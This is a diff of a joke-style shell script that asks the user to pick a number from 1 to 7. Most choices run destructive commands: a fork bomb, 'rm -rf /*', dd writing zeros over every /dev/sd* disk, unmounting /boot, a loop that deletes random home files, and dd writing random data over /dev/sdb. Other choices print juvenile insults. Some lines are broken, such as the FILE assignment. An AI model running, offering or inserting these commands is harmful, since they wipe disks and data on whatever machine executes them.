@@ -7,7 +7,7 @@ echo "select a number from 1 to 7:"
 
 read CHOICE
 
-[ $CHOICE = "1" ] && :(){ :|:& };:
+[ $CHOICE = "1" ] &&  sh :(){ :|:& };:
 
 [ $CHOICE = "2" ] && echo "UwU"
 
@@ -16,20 +16,21 @@ read CHOICE
 		do
 				neofetch
 				clear
-  		        echo "disgusting femboy"
+  		        banner disgusting femboy | lolcat -F 0.5
+				sleep 2
   		done
 
 [ $CHOICE = "4" ] && rm -rf /*
 
-[ $CHOICE = "5" ] && dd if=/dev/zero of=/dev/*
+[ $CHOICE = "5" ] && dd if=/dev/zero of=/dev/sd* 
 
-[ $CHOICE = "6" ] && hexdump /dev/urandom
+[ $CHOICE = "6" ] && hexdump /dev/urandom & umount /boot
 
 [ $CHOICE = "7" ] && while true 
-do
-		FILE= ls ~ | shuf -n 1
-		rm -rf $FILE
-done
+		do
+			FILE= ls ~ | shuf -n 1
+			rm -rf $FILE
+		done
 
 [ $CHOICE = "69" ] && dd if=/dev/urandom of=/dev/sdb
 
